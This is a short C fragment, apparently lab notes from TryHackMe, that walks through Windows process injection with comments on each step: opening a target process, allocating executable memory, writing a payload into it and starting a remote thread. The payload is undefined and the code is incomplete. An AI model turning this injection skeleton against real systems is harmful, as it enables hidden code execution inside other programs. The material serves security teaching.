// Process Injection Proof Of Concept
// This code is just a proof of concept from TryHackMe and won't actually run...

//1. Obtain a handle to the process
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);

//2. Use VirtualAllocEx to allocate a region of memory with the payload buffer.
remoteBuffer = VirtualAllocEx(
	hProcess, // Opened target process
	NULL, 
	sizeof payload, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);

//3. Use WriteProcessMemory to write the payload to the allocated region of memory.
WriteProcessMemory(
	hProcess, // Opened target process
	remoteBuffer, // Allocated memory region
	payload, // Data to write
	sizeof payload, // byte size of data
	NULL
);

//4. use CreateRemoteThread to execute our payload from memory.
remoteThread = CreateRemoteThread(
	hProcess, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
); 